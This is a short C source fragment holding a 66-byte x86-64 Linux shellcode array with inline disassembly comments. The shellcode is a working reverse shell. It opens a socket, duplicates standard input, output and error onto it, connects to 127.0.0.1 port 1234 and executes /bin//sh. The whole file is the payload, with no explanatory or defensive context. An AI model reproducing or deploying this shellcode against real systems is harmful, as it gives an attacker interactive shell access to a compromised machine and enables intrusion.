
#define RS_SIZE 66

char RS[] = {
  /* 0000 */ "\x48\xb8\xfd\xff\xfb\x2d\x80\xff\xff\xfe" /* mov rax, 0xfeffff802dfbfffd */
  /* 000A */ "\x48\xf7\xd0"                             /* not rax                     */
  /* 000D */ "\x50"                                     /* push rax                    */
  /* 000E */ "\x54"                                     /* push rsp                    */
  /* 000F */ "\x6a\x29"                                 /* push 0x29                   */
  /* 0011 */ "\x58"                                     /* pop rax                     */
  /* 0012 */ "\x6a\x01"                                 /* push 0x1                    */
  /* 0014 */ "\x5e"                                     /* pop rsi                     */
  /* 0015 */ "\x6a\x02"                                 /* push 0x2                    */
  /* 0017 */ "\x5f"                                     /* pop rdi                     */
  /* 0018 */ "\x99"                                     /* cdq                         */
  /* 0019 */ "\x0f\x05"                                 /* syscall                     */
  /* 001B */ "\x97"                                     /* xchg edi, eax               */
  /* 001C */ "\x96"                                     /* xchg esi, eax               */
  /* 001D */ "\xb0\x21"                                 /* mov al, 0x21                */
  /* 001F */ "\x0f\x05"                                 /* syscall                     */
  /* 0021 */ "\x83\xee\x01"                             /* sub esi, 0x1                */
  /* 0024 */ "\x79\xf7"                                 /* jns 0x1d                    */
  /* 0026 */ "\x5e"                                     /* pop rsi                     */
  /* 0027 */ "\xb2\x10"                                 /* mov dl, 0x10                */
  /* 0029 */ "\xb0\x2a"                                 /* mov al, 0x2a                */
  /* 002B */ "\x0f\x05"                                 /* syscall                     */
  /* 002D */ "\x52"                                     /* push rdx                    */
  /* 002E */ "\x5e"                                     /* pop rsi                     */
  /* 002F */ "\x52"                                     /* push rdx                    */
  /* 0030 */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
  /* 003A */ "\x51"                                     /* push rcx                    */
  /* 003B */ "\x54"                                     /* push rsp                    */
  /* 003C */ "\x5f"                                     /* pop rdi                     */
  /* 003D */ "\x99"                                     /* cdq                         */
  /* 003E */ "\xb0\x3b"                                 /* mov al, 0x3b                */
  /* 0040 */ "\x0f\x05"                                 /* syscall                     */
};